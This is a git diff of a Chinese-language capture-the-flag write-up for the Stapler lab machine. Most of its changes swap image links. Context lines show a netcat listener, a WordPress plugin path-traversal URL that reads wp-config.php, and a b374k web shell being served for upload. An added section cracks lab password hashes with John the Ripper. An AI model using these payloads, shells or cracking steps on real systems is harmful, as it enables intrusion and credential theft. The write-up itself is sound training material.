@@ -328,10 +328,10 @@ harry@192.168.0.152: Permission denied (publickey,password).
 + OSVDB-3233: GET /icons/README: Apache default file found.
 + GET /phpmyadmin/: phpMyAdmin directory found
 ```
-<img src="./images/1.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/1.png" width="56%">
 得到两个用户名：tim、zoe
 访问web页面https://192.168.0.150:12380/blogblog/：
-<img src="./images/2.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/2.png" width="56%">
 看到wordpress后，使用wpscan跑一下：
 ```shell
 ┌──(root㉿kali)-[/stapler]
@@ -761,7 +761,7 @@ john/incorrect(web管理员，可以上传文件)
 
 # Exploitation
 ## 1. 通过john/incorrect获取shell
-<img src="./images/3.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/3.png" width="56%">
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# nc -lnvp 80
@@ -1239,7 +1239,7 @@ Shellcodes: No Results
 1. 漏洞POC：http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
     我们构造的POC：https://192.168.0.150:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
 2. 查看漏洞的结果是在：
-   <img src="./images/4.png" width="56%">
+   <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/4.png" width="56%">
 3. <font color="red">而且需要注意他是将内容(txt)，直接复制到文件中，并将文件后缀改成了png，因此我们在浏览器中是看不到内容的，只能将图片以文本格式打开才可以看到内容。（这在39646.py--searchsploit中写的并不详细）</font>
 4. 自己写了一个exp如下：
 ```python
@@ -1490,14 +1490,14 @@ Result			: Succeeded : [ b374k.php ] Filesize : 111695
 Serving HTTP on :: port 8080 (http://[::]:8080/) ...
 ::ffff:192.168.0.154 - - [05/Jul/2022 13:36:15] "GET /b374k.php HTTP/1.1" 200 -
 ```
-<img src="./images/5.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/5.png" width="56%">
 访问大马：
-<img src="./images/6.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/6.png" width="56%">
 
 ## 4. 通过phpmyadmin获取shell(与mysql相似，只不过是web界面操作)
-<img src="./images/7.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/7.png" width="56%">
 访问小马，并反弹一个shell：
-<img src="./images/8.png" width="56%">
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/8.png" width="56%">
 得到一个shell:
 ```shell
 ┌──(root㉿kali)-[/stapler]
@@ -3770,3 +3770,42 @@ cat flag.txt
 b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
 # Conclusion
+## 1. 利用john进行密码破解：
+导出mysql存放的用户名和密码
+```shell
+┌──(root㉿kali)-[/stapler]
+└─# cat mysqlpass.txt
+John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.
+Elly:$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0
+Peter:$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0
+barry:$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0
+heather:$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10
+garry:$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1
+harry:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0
+scott:$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1
+kathy:$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0
+tim:$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0
+ZOE:$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1
+Dave:$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.
+Simon:$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0
+Abby:$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.
+Vicki:$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131
+Pam:$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0
+┌──(root㉿kali)-[/stapler]
+└─# john mysqlpass.txt --show --format=phpass > cracked.txt
+
+┌──(root㉿kali)-[/stapler]
+└─# cat cracked.txt
+John:incorrect
+Elly:ylle
+barry:washere
+heather:passphrase
+garry:football
+harry:monkey
+scott:cookie
+kathy:coolgirl
+tim:thumb
+ZOE:partyqueen
+Dave:damachine
+Pam:0520
+```
